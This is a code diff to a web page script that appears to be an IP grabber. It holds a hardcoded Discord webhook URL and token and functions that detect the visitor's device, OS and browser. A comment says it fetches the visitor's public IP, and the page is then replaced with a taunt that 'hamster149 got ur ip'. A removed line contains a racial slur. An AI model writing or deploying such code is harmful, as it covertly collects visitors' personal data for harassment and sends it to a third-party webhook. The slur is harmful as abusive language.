@@ -1,6 +1,12 @@
 <script>
 const webhookUrl = "https://discord.com/api/webhooks/1446998835229626412/aL3byydfp-9STVBzdf8SMsAiTASlJFHxQrjts7rttPgGlhcCvNE1adAd2ESDJd5qdS4B"; 
 
+// Load Fredoka One font
+const fontLink = document.createElement('link');
+fontLink.href = 'https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap';
+fontLink.rel = 'stylesheet';
+document.head.appendChild(fontLink);
+
 // Device / OS / Browser detection
 function getDeviceType() {
   const ua = navigator.userAgent;
@@ -28,7 +34,24 @@ function getBrowser() {
 
 // Function to display the message
 function showMessage() {
-  document.body.innerHTML = '<div style="text-align: center; font-size: 24px; font-weight: bold; margin-top: 50px; color: red;">haha hamster149 got ur ip nigga</div>';
+  document.body.innerHTML = `
+    <div style="
+      font-family: 'Fredoka One', cursive;
+      font-size: 48px;
+      font-weight: bold;
+      color: black;
+      text-align: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
+    ">
+      oh nooo hamster149 got ur ip (×_×#)
+    </div>
+  `;
 }
 
 // Fetch the visitor's public IP (IPv4 or IPv6)
